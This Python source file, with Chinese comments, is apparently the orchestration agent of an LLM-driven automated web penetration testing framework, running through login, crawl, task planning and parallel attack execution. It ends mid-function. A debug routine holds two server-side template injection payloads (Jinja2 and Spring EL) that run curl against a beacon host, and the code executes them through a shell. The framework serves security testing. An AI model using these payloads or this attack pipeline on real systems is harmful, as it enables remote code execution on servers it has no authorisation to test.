"""
High-Level Decision Agent
自主化安全测试的顶层决策Agent
"""

import json
import time
import re
from pathlib import Path
from typing import Dict, Any, Optional, List
from datetime import datetime

from seleniumwire import webdriver
from selenium.webdriver.remote.webdriver import WebDriver

from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

from crawl.crawler import Crawler
from task.tasks import Task
from account.account_manager import AccountManager
from plan_agent.task_planning_agent import TaskPlanningAgent
from plan_agent.attack_planning_agent import AttackPlanningAgent
from attack_agent.attack_executor import AttackExecutor
# 🆕 不再导入具体的 agent 类（改为在 AttackExecutor 中按需创建）

# 猴子补丁，修改原始get方法，避免老超时报错导致程序终止
# 保存原始 get 方法
_original_get = WebDriver.get

# 定义静默版 get 方法
def silent_get(self, url, modify=False):
    try:
        _original_get(self, url)
        # 部分网页需要刷新
        # self.refresh()
        time.sleep(2)
        return True
    except Exception as e:  # 捕获异常对象 e
        print(f"静默失败{url}，异常信息: {e}")  # 打印异常信息
        return False

# 替换默认的 get 方法
WebDriver.get = silent_get

def send(driver, cmd, params={}):
    return driver.execute_cdp_cmd(cmd, params)

def add_script(driver, script):
  send(driver, "Page.addScriptToEvaluateOnNewDocument", {"source": script})

WebDriver.add_script = add_script

class HighLevelDecisionAgent:
    """
    顶层决策Agent

    工作流程：
    1. Login - 执行登录任务
    2. Deep Crawl - 深度爬取（50页）
    3. Task Planning - 任务规划
    4. Attack Planning - 攻击规划
    5. Attack Execution - 攻击执行
    6. Report Generation - 生成报告
    """

    def __init__(self,
                 client,
                 initial_url: str,
                 login_task: Optional[str] = None,
                 crawl_start_url: Optional[str] = None,
                 output_dir: str = "output",
                 chrome_options = None,
                 config: Optional[Dict] = None,
                 target_domain: Optional[str] = None):  # 🆕 新增参数
        """
        初始化顶层决策Agent

        Args:
            client: OpenAI client
            initial_url: 目标URL（登录页面或应用首页）
            login_task: 登录任务描述（可选）
            crawl_start_url: 爬取起始URL（可选，登录后导航到此URL开始爬取）
            output_dir: 输出目录
            chrome_options: Chrome选项（可选）
            config: 配置字典（可选），包含以下可配置项：
                - crawl_max_pages: 爬取最大页面数（默认50）
                - crawl_time_limit: 爬取时间限制秒数（默认None，无限制）
                - crawl_max_llm_workers: 爬取时LLM任务最大并发数（默认20）
                - task_planning_max_iterations: 任务规划最大迭代次数（默认200，之前是100）
                - task_planning_max_workers: 任务执行并行worker数（默认5）
                - attack_planning_max_iterations: 攻击规划最大迭代次数（默认100）
                - attack_planning_mode: 攻击规划模式："llm"（LLM智能规划，默认）或 "exhaustive"（穷举全测，用于消融实验）
                - attack_execution_max_workers: 攻击执行并行worker数（默认10）
        """
        self.client = client
        self.initial_url = initial_url
        self.login_task = login_task
        self.crawl_start_url = crawl_start_url
        self.output_dir = Path(output_dir)
        self.chrome_options = chrome_options
        # 🆕 确定目标域名（优先使用传入的，否则从initial_url提取）
        if target_domain:
            self.target_domain = target_domain
            print(f"[DecisionAgent] 使用传入的目标域名: {self.target_domain}")
        else:
            from urllib.parse import urlparse
            parsed = urlparse(initial_url)
            self.target_domain = parsed.hostname  # 提取域名（不含端口）
            print(f"[DecisionAgent] 从initial_url自动提取目标域名: {self.target_domain}")

        self.config = {
            # Phase 2: 爬取
            "crawl_max_pages": 100,
            "crawl_time_limit": None,
            "crawl_max_llm_workers": 20,

            # Phase 3: 任务规划
            "task_planning_max_iterations": 100,  #
            "task_planning_max_workers": 10,

            # Phase 4: 攻击规划
            "attack_planning_max_iterations": 100,
            "attack_planning_mode": "llm",  # 🆕 攻击规划模式："llm"（智能规划）或 "exhaustive"（穷举全测）

            # Phase 5: 攻击执行
            "attack_execution_max_workers": 10,
        }

        # 覆盖用户自定义配置
        if config:
            self.config.update(config)

        # 创建输出目录结构
        self.dirs = {
            "crawl": self.output_dir / "crawl",
            "task_planning": self.output_dir / "task_planning",
            "attack_planning": self.output_dir / "attack_planning",
            "attack_execution": self.output_dir / "attack_execution",
            "attack_logs": self.output_dir / "attack_logs"
        }
        for dir_path in self.dirs.values():
            dir_path.mkdir(parents=True, exist_ok=True)

        # 日志文件
        self.log_path = self.output_dir / "high_level_agent.log"

        # 初始化状态
        self.state = {
            "current_phase": "init",
            "start_time": datetime.now().isoformat(),
            "initial_url": initial_url,
            "login_task": login_task,

            # 各阶段完成标记
            "login_complete": False,
            "crawl_complete": False,
            "task_planning_complete": False,
            "attack_planning_complete": False,
            "attack_execution_complete": False,

            # 统计信息
            "pages_count": 0,
            "tasks_executed": 0,
            "attacks_planned": 0,
            "vulnerabilities_found": 0
        }

        # 共享组件
        self.driver = None
        self.account_manager = None

        # 各阶段组件
        self.crawler = None
        self.task_planner = None
        self.attack_planner = None
        self.executor = None
        # 🆕 保存worker drivers（从Task Planning传递到Attack）
        self.worker_drivers = []

        # 时间统计
        self.phase_times = {}

    def _log(self, *args):
        """记录日志"""
        msg = " ".join(str(a) for a in args)
        print(msg)
        try:
            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now().isoformat()}] {msg}\n")
        except Exception:
            pass

    def _save_state(self):
        """保存当前状态"""
        state_path = self.output_dir / "agent_state.json"
        try:
            with open(state_path, 'w', encoding='utf-8') as f:
                json.dump(self.state, f, indent=2, ensure_ascii=False)
        except Exception as e:
            self._log(f"Warning: Failed to save state: {e}")

    def run(self) -> Dict[str, Any]:
        """执行完整的自动化测试流程"""
        try:
            self._log("\n" + "="*70)
            self._log("🚀 启动自主化安全测试框架")
            self._log("="*70)
            self._log(f"目标URL: {self.initial_url}")
            if self.login_task:
                self._log(f"登录任务: {self.login_task}")
            else:
                self._log(f"登录任务: 无（直接爬取）")
            self._log("="*70 + "\n")

            # 初始化driver
            self._init_driver()

            # ✅ 提前初始化crawler（Phase 1需要使用crawler.run_a_task执行登录任务）
            self.crawler = Crawler(
                driver=self.driver,
                client=self.client,
                initial_url=self.initial_url,
                target_domain=self.target_domain, # 🆕 传入参数
                store_root=str(self.dirs["crawl"])
            )

            # 2. 测试 xss() 函数
            # 发送一个特征字符串 "TEST_INIT_BEACON"
            # self._log(f"[DEBUG] 执行浏览器端 JS: xss()")
            # self.driver.get(self.initial_url)
            # # 这里的 execute_script 是同步的，如果 xss 函数有问题会直接抛出异常
            # self.driver.execute_script("xss(4244564)")
            # self._log(f"[DEBUG] 执行浏览器端 JS 完成")

            # 阶段1: 执行登录（如果提供了login_task）
            if self.login_task:
                self._phase_1_login()
            else:
                self._log("\n[阶段1] 跳过登录，直接进入爬取阶段")
                self.state["login_complete"] = False

            # ✅ DEBUG: 重放命令（不需要时注释掉下面这行）
            # self._debug_replay_commands()

            # ✅ TEST: 测试独立driver创建（验证通过后注释掉下面这行）
            # self._test_create_cloned_drivers()

            # 阶段2: 深度爬取（复用已创建的crawler）
            self._phase_2_crawl()

            # 阶段3: 任务规划
            self._phase_3_task_planning()

            # 🆕 阶段4+5: 流水线并行攻击（替代原来的Phase 4和Phase 5）
            self._phase_4_5_pipeline_attack()

            # 生成最终报告
            self._generate_final_report()

            # 返回结果
            return {
                "crawling": {
                    "total_pages": self.state["pages_count"]
                },
                "testing": {
                    "tasks_executed": self.state["tasks_executed"],
                    "attacks_planned": self.state["attacks_planned"],
                    "vulnerabilities_found": self.state["vulnerabilities_found"]
                },
                "timing": {
                    "total_seconds": sum(self.phase_times.values())
                }
            }

        except Exception as e:
            self._log(f"\n❌ 测试流程异常: {e}")
            import traceback
            self._log(traceback.format_exc())
            raise
        finally:
            self._cleanup()

    def _init_driver(self):
        """初始化浏览器driver"""
        self._log("\n[初始化] 启动浏览器...")

        if not self.chrome_options:
            chrome_options = webdriver.ChromeOptions()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--disable-web-security")
            chrome_options.add_argument("--allow-running-insecure-content")
            chrome_options.add_argument("--disable-xss-auditor")
            self.chrome_options = chrome_options

        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=self.chrome_options)

        self.driver.set_page_load_timeout(60)
        self.driver.set_script_timeout(60)
        self.driver.set_window_size(1920, 1080)

        # 拦截外部请求
        def interceptor(request):
            request_url = request.url
            # if '127.0.0.1' not in request_url and 'localhost' not in request_url:
            if self.target_domain not in request_url:
                request.abort()

        self.driver.request_interceptor = interceptor

        # ✅ 注入XSS检测脚本（关键修复）
        self.driver.add_script( open("js/xss_xhr.js", "r").read() )

        # ✅ 注入事件监听器捕获脚本（新增）
        # 注意：lib.js 必须先于 addeventlistener_wrapper.js 加载
        self.driver.add_script( open("js/md5.js", "r").read() )
        self.driver.add_script( open("js/lib.js", "r").read() )
        self.driver.add_script( open("js/addeventlistener_wrapper.js", "r").read() )
        self._log("[初始化] 事件监听器捕获脚本已注入")

        self._log("[初始化] 浏览器启动成功")

    def _phase_1_login(self):
        """阶段1: 执行登录任务"""
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("阶段1: 执行登录")
        self._log("="*70)
        self._log(f"登录页面: {self.initial_url}")
        self._log(f"任务描述: {self.login_task}")

        try:
            # ✅ 修复：初始化 AccountManager（使用正确的参数）
            if not self.account_manager:
                self.account_manager = AccountManager(
                    store_path=str(self.output_dir / "accounts.json"),
                    chrome_options=self.chrome_options,
                    default_login_url=self.initial_url
                )

            # 导航到登录页面
            self.driver.get(self.initial_url)
            time.sleep(2)

            # 创建登录任务
            task = Task(
                task_id=1,
                description=self.login_task,
                initial_url=self.initial_url
            )

            # ✅ 保存 task 对象（用于Phase 5恢复登录）
            self.login_task_object = task

            # ✅ 修复：执行登录（使用crawler.run_a_task）
            self._log("\n[执行登录任务]")
            self.crawler.run_a_task(task, logging_in=True)

            # ✅ 提取凭证并创建 default_account
            self._log("\n[创建 default_account]")
            time.sleep(1)  # 等待页面稳定
            credentials = self.account_manager._extract_credentials(self.driver)
            self.account_manager.create_account_from_credentials(
                account_id="default_account",
                credentials=credentials,
                role="main_user",
                login_url=self.initial_url
            )
            # 保存 driver 引用
            self.account_manager.set_driver("default_account", self.driver)
            self._log("[default_account] 已创建并保存主 driver 的凭证")

            # 更新状态
            self.state["login_complete"] = True
            self.state["current_phase"] = "login_complete"
            self._save_state()

            phase_duration = time.time() - phase_start
            self.phase_times["phase_1_login"] = phase_duration

            self._log(f"\n[阶段1完成] 登录成功")
            self._log(f"⏱️  用时: {phase_duration:.1f}秒")

        except Exception as e:
            self._log(f"\n❌ 登录失败: {e}")
            import traceback
            self._log(traceback.format_exc())
            raise

    def _phase_2_crawl(self):
        """阶段2: 深度爬取（50页）"""
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("阶段2: 深度爬取（Deep Crawl）")
        self._log("="*70)
        self._log(f"参数: max_pages={self.config['crawl_max_pages']}, time_limit={self.config['crawl_time_limit']}")

        # 确定起始URL
        if self.crawl_start_url:
            # 如果指定了爬取起始URL，使用它
            start_url = self.crawl_start_url
            self._log(f"模式: 指定起始URL爬取")
            # 导航到指定URL
            self.driver.get(self.crawl_start_url)
            time.sleep(2)
        elif self.state.get("login_complete", False):
            # 如果已登录且未指定起始URL，从当前页面开始爬取
            start_url = self.driver.current_url
            self._log(f"模式: 已认证爬取（从登录后页面开始）")
        else:
            # 如果未登录，从初始URL开始爬取
            start_url = self.initial_url
            self._log(f"模式: 无认证爬取（从目标URL开始）")
            # 导航到初始URL
            self.driver.get(self.initial_url)
            time.sleep(2)

        self._log(f"起始URL: {start_url}")

        # ✅ 修复：crawler已在run()中创建，这里只需要更新initial_url
        # 如果起始URL与创建时不同，更新crawler的initial_url
        if start_url != self.crawler.initial_url:
            self._log(f"[更新crawler起始URL] {self.crawler.initial_url} -> {start_url}")
            self.crawler.initial_url = start_url

        # 执行深度爬取
        self.crawler.crawl(
            max_pages=self.config["crawl_max_pages"],
            time_limit=self.config["crawl_time_limit"],
            max_llm_workers=self.config["crawl_max_llm_workers"]
        )

        # 导出结果
        self.crawler.export_task_plan_graph(
            output_path=str(self.dirs["crawl"] / "task_plan_graph.json")
        )

        # ✅ 如果没有登录（无认证场景），创建 default_account
        if not self.state.get("login_complete", False):
            self._log("\n[创建 default_account（无认证场景）]")

            # 初始化 AccountManager（如果还没有）
            if not self.account_manager:
                self.account_manager = AccountManager(
                    store_path=str(self.output_dir / "accounts.json"),
                    chrome_options=self.chrome_options,
                    default_login_url=self.initial_url
                )

            # 提取当前 driver 的状态（可能是空凭证）
            credentials = self.account_manager._extract_credentials(self.driver)
            self.account_manager.create_account_from_credentials(
                account_id="default_account",
                credentials=credentials,
                role="unauthenticated",
                login_url=self.initial_url
            )
            # 保存 driver 引用
            self.account_manager.set_driver("default_account", self.driver)
            self._log("[default_account] 已创建（无认证模式）")

        # 更新状态
        self.state["crawl_complete"] = True
        self.state["pages_count"] = len(self.crawler.store.pages)
        self.state["current_phase"] = "crawl_complete"
        self._save_state()

        phase_duration = time.time() - phase_start
        self.phase_times["phase_2_crawl"] = phase_duration

        self._log(f"\n[阶段2完成] 发现 {self.state['pages_count']} 个页面")
        self._log(f"⏱️  用时: {phase_duration:.1f}秒")

    def _phase_3_task_planning(self, use_parallel: bool = True):
        """
        阶段3: 任务规划与执行

        Args:
            use_parallel: 是否使用并行模式（默认True）
                - True: 使用10个独立driver并行执行任务
                - False: 使用串行模式（向后兼容）
        """
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("阶段3: 任务规划与执行（Task Planning & Execution）")
        self._log(f"模式: {'并行' if use_parallel else '串行'}")
        self._log("="*70)

        # 初始化AccountManager（如果还没有）
        if not self.account_manager:
            self.account_manager = AccountManager(
                store_path=str(self.output_dir / "accounts.json"),
                chrome_options=None,
                default_login_url=self.initial_url
            )

        # 创建TaskPlanningAgent
        self.task_planner = TaskPlanningAgent(
            client=self.client,
            crawler=self.crawler,
            account_manager=self.account_manager
        )

        # 根据模式选择执行方式
        if use_parallel:
            # ===== 并行模式 =====
            self._log(f"\n[并行模式] 使用{self.config['task_planning_max_workers']}个独立driver并行执行任务")

            try:
                from parallel.parallel_task_scheduler import ParallelTaskScheduler

                scheduler = ParallelTaskScheduler(
                    crawler=self.crawler,
                    task_planning_agent=self.task_planner,
                    account_manager=self.account_manager,
                    client=self.client,
                    max_workers=self.config["task_planning_max_workers"]
                )

                result = scheduler.run(max_iterations=self.config["task_planning_max_iterations"], target_domain=self.target_domain)

                # 统计结果
                total_tasks = result.get("total_pages", 0)  # 并行模式返回执行的页面数

                # 🆕 保存worker drivers（不销毁，传递给Attack阶段）
                self.worker_drivers = scheduler.get_worker_drivers()
                self._log(f"\n[Worker Drivers] Saved {len(self.worker_drivers)} driver(s) for attack phase")

            except Exception as e:
                self._log(f"\n[并行模式] ✗ 执行失败，回退到串行模式: {e}")
                import traceback
                traceback.print_exc()

                # 回退到串行模式
                result = self.task_planner.plan_and_execute(max_iterations=self.config["task_planning_max_iterations"])
                total_tasks = result['total_tasks']

        else:
            # ===== 串行模式（原逻辑） =====
            self._log("\n[串行模式] 使用主driver串行执行任务")
            result = self.task_planner.plan_and_execute(max_iterations=self.config["task_planning_max_iterations"])
            total_tasks = result['total_tasks']

        # 保存结果
        self.crawler.export_execution_graph_with_requests(
            output_path=str(self.dirs["task_planning"] / "execution_graph_with_requests.json")
        )

        # 更新状态
        self.state["task_planning_complete"] = True
        self.state["tasks_executed"] = total_tasks
        self.state["current_phase"] = "task_planning_complete"
        self._save_state()

        phase_duration = time.time() - phase_start
        self.phase_times["phase_3_task_planning"] = phase_duration

        self._log(f"\n[阶段3完成] 执行任务/页面数: {total_tasks}")
        self._log(f"⏱️  用时: {phase_duration:.1f}秒")

    def _phase_4_5_pipeline_attack(self):
        """
        🆕 阶段4+5: 流水线并行攻击（Attack Planning + Execution Pipeline）

        改进：
        - Phase 4和Phase 5同时运行
        - Phase 4持续生成任务 → 放入队列
        - Phase 5从队列取任务 → 并行执行（10 workers）
        - 预期：Phase 4 (3分钟) 与 Phase 5 (3分钟) 重叠 → 总计约3分钟
        """
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("阶段4+5: 流水线并行攻击（Attack Planning + Execution Pipeline）")
        self._log("="*70)
        self._log("模式: Phase 4 (Planning) 和 Phase 5 (Execution) 并行运行")
        self._log("  - Planning线程: 持续生成任务并放入队列")
        self._log("  - Execution线程池: 10个worker并发执行任务")
        self._log("="*70 + "\n")

        # 创建任务队列
        import queue
        import threading

        task_queue = queue.Queue(maxsize=100)  # 限制队列大小，避免内存溢出

        # ⚠️ 已禁用：定期保活线程（因为每个任务开始时已经有保活操作）
        # 🆕 启动Session保活线程（保持主driver的session活跃）
        # from utils.session_keepalive import SessionKeepAliveThread

        # keepalive_thread = SessionKeepAliveThread(
        #     driver=self.driver,
        #     initial_url=self.crawler.initial_url,  # 🆕 固定访问登录后的初始页面
        #     screenshot_dir=str(self.dirs["attack_execution"] / "session_keepalive"),
        #     interval=60  # 每60秒访问一次随机页面
        # )
        # keepalive_thread.start()
        # self._log("[KeepAlive] Session保活线程已启动（每60秒访问初始页面并截图）\n")

        # 创建AttackPlanningAgent
        self.attack_planner = AttackPlanningAgent(
            client=self.client,
            crawler=self.crawler,
            account_manager=self.account_manager,
            ctf_description=None,
            default_account="default_account",
            planning_mode=self.config["attack_planning_mode"]  # 🆕 传入规划模式
        )

        # ✅ 启动Phase 4规划线程（生产者）
        def planning_worker():
            """规划线程：持续生成任务并放入队列"""
            try:
                self._log("[Phase 4 Thread] Starting attack planning...")
                result = self.attack_planner.plan_and_stream(task_queue, max_iterations=self.config["attack_planning_max_iterations"])
                self._log(f"[Phase 4 Thread] Planning complete - {result['total_tasks_generated']} tasks generated")
                return result
            except Exception as e:
                self._log(f"[Phase 4 Thread] Error: {e}")
                import traceback
                self._log(traceback.format_exc())
                # 发送结束信号（即使失败也要通知executor）
                task_queue.put(None)
                return None

        planning_thread = threading.Thread(target=planning_worker, daemon=False)
        planning_thread.start()
        self._log("[Phase 4 Thread] Planning thread started\n")

        # ✅ Phase 5在主线程执行（消费者）
        # 🆕 不再预创建 agent 实例（改为在 AttackExecutor 中按需创建）
        # 创建AttackExecutor
        from attack_agent.attack_executor import AttackExecutor

        self.executor = AttackExecutor(
            account_manager=self.account_manager,
            crawler=self.crawler,
            client=self.client,
            driver=self.driver,
            beacon_base="http://172.17.0.1:9091/",  # 🆕 统一的 beacon URL
            log_dir=str(self.dirs["attack_execution"]),
            edges_file=str(self.dirs["crawl"] / "edges.jsonl"),
            worker_drivers=self.worker_drivers,  # 🆕 传递worker drivers
            chrome_options=self.chrome_options,  # 🆕 传递chrome options（用于创建driver）
            initial_url=self.crawler.initial_url,  # 🔧 修复：传递登录后的页面URL（用于登录检查）
            login_task=getattr(self, 'login_task_object', None),  # ✅ 修复：传递 Task 对象而不是字符串
            target_domain=self.target_domain  # ✅ 补上这个关键参数！
        )

        # ✅ 执行任务（从队列消费）
        self._log("[Phase 5 Main Thread] Starting attack execution from queue...\n")
        execution_results = self.executor.execute_tasks_from_queue(
            task_queue,
            max_workers=self.config["attack_execution_max_workers"]
        )

        # ✅ 等待规划线程完成
        self._log("\n[Main Thread] Waiting for planning thread to finish...")
        planning_thread.join(timeout=300)  # 最多等5分钟
        if planning_thread.is_alive():
            self._log("[Main Thread] Warning: Planning thread still running after 5 minutes")
        else:
            self._log("[Main Thread] Planning thread finished")

        # ⚠️ 已禁用：停止定期保活线程
        # 🆕 停止Session保活线程
        # self._log("\n[KeepAlive] Stopping session keep-alive thread...")
        # keepalive_thread.stop()
        # self._log("[KeepAlive] Session保活线程已停止\n")

        # 统计漏洞
        vulnerabilities = sum(
            1 for r in execution_results
            if r.get('result', {}).get('vulnerable') is True
        )

        # 更新状态
        self.state["attack_planning_complete"] = True
        self.state["attack_execution_complete"] = True
        self.state["attacks_planned"] = len(execution_results)
        self.state["vulnerabilities_found"] = vulnerabilities
        self.state["current_phase"] = "pipeline_attack_complete"
        self._save_state()

        phase_duration = time.time() - phase_start
        self.phase_times["phase_4_5_pipeline"] = phase_duration

        self._log(f"\n[阶段4+5完成] 发现漏洞: {vulnerabilities}")
        self._log(f"⏱️  用时: {phase_duration:.1f}秒")
        self._log(f"💡 性能提升: 使用流水线并行模式大幅缩短测试时间")

        # 保存结果供报告使用
        self.execution_results = execution_results

    def _phase_4_attack_planning(self):
        """
        ⚠️  已弃用：请使用 _phase_4_5_pipeline_attack()

        阶段4: 攻击规划（单独执行模式）
        """
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("阶段4: 攻击规划（Attack Planning）")
        self._log("="*70)

        # 创建AttackPlanningAgent
        self.attack_planner = AttackPlanningAgent(
            client=self.client,
            crawler=self.crawler,
            account_manager=self.account_manager,
            ctf_description=None,
            default_account="default_account",
            planning_mode=self.config["attack_planning_mode"]  # 🆕 传入规划模式
        )

        # 执行攻击规划
        result = self.attack_planner.plan_and_execute()

        # 保存结果
        serialized_tasks = [
            {
                "task_id": task.task_id,
                "task_description": task.task_description,
                "vuln_type": task.vuln_type,
                "target_request": task.target_request,
                "account_identifier": task.account_identifier
            }
            for task in result['all_tasks']
        ]

        with open(self.dirs["attack_planning"] / "attack_tasks.json", 'w', encoding='utf-8') as f:
            json.dump(serialized_tasks, f, indent=2, ensure_ascii=False)

        # 更新状态
        self.state["attack_planning_complete"] = True
        self.state["attacks_planned"] = len(result['all_tasks'])
        self.state["current_phase"] = "attack_planning_complete"
        self._save_state()

        phase_duration = time.time() - phase_start
        self.phase_times["phase_4_attack_planning"] = phase_duration

        self._log(f"\n[阶段4完成] 生成攻击任务: {len(result['all_tasks'])}")
        self._log(f"⏱️  用时: {phase_duration:.1f}秒")

        # 保存attack_planner的结果供后续使用
        self.attack_tasks = result['all_tasks']

    def _phase_5_attack_execution(self):
        """阶段5: 攻击执行（🆕 并行模式）

        ⚠️  已弃用：建议使用 _phase_4_5_pipeline_attack() 流水线模式
        """
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("阶段5: 攻击执行（Attack Execution - PARALLEL MODE）")
        self._log("="*70)

        # 🆕 不再预创建 agent 实例（改为在 AttackExecutor 中按需创建）
        # 创建AttackExecutor
        self.executor = AttackExecutor(
            account_manager=self.account_manager,
            crawler=self.crawler,
            client=self.client,
            driver=self.driver,
            beacon_base="http://172.17.0.1:9091/",
            log_dir=str(self.dirs["attack_execution"]),
            edges_file=str(self.dirs["crawl"] / "edges.jsonl"),
            worker_drivers=self.worker_drivers,  # 🆕 传递worker drivers（即使旧方法也支持）
            chrome_options=self.chrome_options,  # 🆕 传递chrome options
            initial_url=self.crawler.initial_url,  # 🔧 修复：传递登录后的页面URL（用于登录检查）
            login_task=self.login_task,          # 🆕 传递login task
            target_domain=self.target_domain  # ✅ 补上这个关键参数！
        )

        # 🆕 使用并行执行方法
        self._log(f"\n[并行执行模式] 最大并发数: {self.config['attack_execution_max_workers']}")
        self._log(f"[任务总数] {len(self.attack_tasks)}")
        execution_results = self.executor.execute_tasks_parallel(
            self.attack_tasks,
            max_workers=self.config["attack_execution_max_workers"]
        )

        # 统计漏洞
        vulnerabilities = sum(
            1 for r in execution_results
            if r.get('result', {}).get('vulnerable') is True
        )

        # 更新状态
        self.state["attack_execution_complete"] = True
        self.state["vulnerabilities_found"] = vulnerabilities
        self.state["current_phase"] = "attack_execution_complete"
        self._save_state()

        phase_duration = time.time() - phase_start
        self.phase_times["phase_5_attack_execution"] = phase_duration

        self._log(f"\n[阶段5完成] 发现漏洞: {vulnerabilities}")
        self._log(f"⏱️  用时: {phase_duration:.1f}秒")
        self._log(f"💡 性能提升: 使用并行模式大幅缩短测试时间")

        # 保存结果供报告使用
        self.execution_results = execution_results

    def _generate_final_report(self):
        """生成最终报告"""
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("生成最终报告")
        self._log("="*70)

        # 计算总时间
        total_duration = sum(self.phase_times.values())

        # 构建报告
        report = {
            "metadata": {
                "target_url": self.initial_url,
                "start_time": self.state["start_time"],
                "end_time": datetime.now().isoformat(),
                "total_duration_seconds": total_duration,
                "output_directory": str(self.output_dir)
            },
            "crawling": {
                "total_pages": self.state["pages_count"]
            },
            "testing": {
                "tasks_executed": self.state["tasks_executed"],
                "attacks_planned": self.state["attacks_planned"],
                "vulnerabilities_found": self.state["vulnerabilities_found"]
            },
            "timing": {
                "total_seconds": total_duration,
                "phases": self.phase_times
            },
            "accounts": [
                {
                    "account_id": acc.account_id,
                    "role": acc.role,
                    "is_logged_in": acc.is_logged_in
                }
                for acc in self.account_manager.list_accounts()
            ] if self.account_manager else []
        }

        # 保存报告
        report_path = self.output_dir / "final_report.json"
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        phase_duration = time.time() - phase_start
        self.phase_times["report_generation"] = phase_duration

        self._log(f"\n[报告生成完成] 报告已保存: {report_path}")
        self._log(f"⏱️  用时: {phase_duration:.1f}秒")


    def _debug_replay_commands(self):
        """
        Debug函数：重放指定的curl命令（用于测试）

        使用方法：
        1. 修改 debug_commands 列表中的命令
        2. 在 run() 中的爬取前调用此函数
        3. 不需要时直接注释掉调用即可
        """
        self._log("\n" + "="*70)
        self._log("[DEBUG] Replaying Commands")
        self._log("="*70)

        # ✅ 在这里定义要重放的命令列表
        debug_commands = [
        "curl -s 'http://127.0.0.1:4288/Users/{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('curl http://172.17.0.1:9091/?data=loudongyanzheng').read()}}/Items?SortBy=IsFavoriteOrLiked%2CRandom&IncludeItemTypes=Movie%2CSeries%2CMusicArtist&Limit=20&Recursive=true&ImageTypeLimit=0&EnableImages=false&ParentId=3227ce1e069754c594af25ea66d69fc7&EnableTotalRecordCount=false' -g",
        "curl -s 'http://127.0.0.1:4288/Users/${T(java.lang.Runtime).getRuntime().exec('curl http://172.17.0.1:9091/?data=loudongyanzheng')}/Items?SortBy=IsFavoriteOrLiked%2CRandom&IncludeItemTypes=Movie%2CSeries%2CMusicArtist&Limit=20&Recursive=true&ImageTypeLimit=0&EnableImages=false&ParentId=3227ce1e069754c594af25ea66d69fc7&EnableTotalRecordCount=false' -g",
        ]

        # ✅ 类型检查：确保每个元素都是字符串
        flattened_commands = []
        for item in debug_commands:
            if isinstance(item, list):
                # 如果是嵌套列表，展开
                flattened_commands.extend(item)
            elif isinstance(item, str):
                flattened_commands.append(item)
            else:
                self._log(f"[DEBUG] ⚠️  Skipping invalid item type: {type(item)}")

        if not flattened_commands:
            self._log("[DEBUG] ✗ No valid commands after flattening")
            return

        # 获取 default_account 的凭证
        if not self.account_manager:
            self._log("[DEBUG] ✗ AccountManager not initialized")
            return

        credentials = self.account_manager.get_credentials("default_account")
        if not credentials:
            self._log("[DEBUG] ✗ No credentials found for default_account")
            return

        self._log(f"[DEBUG] ✓ Credentials obtained for default_account")
        self._log(f"[DEBUG] Replaying {len(flattened_commands)} command(s)\n")

        # 导入必要的函数
        from attack_agent.request_utils import append_credentials_to_curl
        import subprocess

        # 执行每个命令
        for idx, cmd in enumerate(flattened_commands, 1):
            # ✅ 再次确认类型
            if not isinstance(cmd, str):
                self._log(f"[DEBUG Command {idx}/{len(flattened_commands)}] ✗ Invalid type: {type(cmd)}, skipping")
                continue

            self._log(f"[DEBUG Command {idx}/{len(flattened_commands)}]")
            cmd_preview = cmd[:100] + "..." if len(cmd) > 100 else cmd
            self._log(f"  Original: {cmd_preview}")

            # 添加凭证
            try:
                cmd_with_creds = append_credentials_to_curl(cmd, credentials)
                creds_preview = cmd_with_creds[:150] + "..." if len(cmd_with_creds) > 150 else cmd_with_creds
                self._log(f"  With Credentials: {creds_preview}")
            except Exception as e:
                self._log(f"  ✗ Failed to add credentials: {e}")
                continue

            # 执行命令
            try:
                process = subprocess.Popen(
                    cmd_with_creds,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, stderr = process.communicate(timeout=15)

                self._log(f"  ✓ Executed (status={process.returncode})")
                self._log(f"  [STDOUT length: {len(stdout)}]")
                if stdout:
                    preview = stdout[:500] if len(stdout) > 500 else stdout
                    self._log(f"  [STDOUT preview]: {preview}")
                    if len(stdout) > 500:
                        self._log(f"  ... (truncated, total {len(stdout)} chars)")

                if stderr:
                    self._log(f"  [STDERR]: {stderr[:200]}")

            except subprocess.TimeoutExpired:
                self._log(f"  ✗ Timeout after 15s")
            except Exception as e:
                self._log(f"  ✗ Error: {e}")

            self._log("")

        self._log("="*70)
        self._log(f"[DEBUG] Replay Complete - {len(flattened_commands)} command(s) processed\n")

    def _test_create_cloned_drivers(self):
        """
        测试函数：验证独立driver的创建和状态克隆

        测试步骤：
        1. 获取主driver当前URL（登录后的URL）
        2. 创建3个独立driver
        3. 让每个独立driver访问主driver的当前URL
        4. 截图验证是否都能正确访问（无需重新登录）
        5. 清理所有独立driver

        使用方法：
        - 在 run() 中的阶段1之后调用此函数
        - 检查截图确认登录状态是否正确克隆
        - 验证无误后可以注释掉
        """
        self._log("\n" + "="*70)
        self._log("[TEST] 测试独立Driver创建")
        self._log("="*70)

        # 导入ParallelDriverManager
        try:
            from parallel.parallel_driver_manager import ParallelDriverManager
        except ImportError as e:
            self._log(f"[TEST] ✗ 导入失败: {e}")
            self._log("[TEST] 请确保 parallel/parallel_driver_manager.py 文件存在")
            return

        # 检查主driver和account_manager
        if not self.driver:
            self._log("[TEST] ✗ 主driver未初始化")
            return

        if not self.account_manager:
            self._log("[TEST] ✗ AccountManager未初始化")
            return

        # 获取主driver当前URL
        current_url = self.driver.current_url
        self._log(f"[TEST] 主driver当前URL: {current_url}")

        # 创建测试截图目录
        test_screenshot_dir = self.output_dir / "test_parallel_drivers"
        test_screenshot_dir.mkdir(parents=True, exist_ok=True)
        self._log(f"[TEST] 截图保存目录: {test_screenshot_dir}")

        # 主driver截图（作为对比基准）
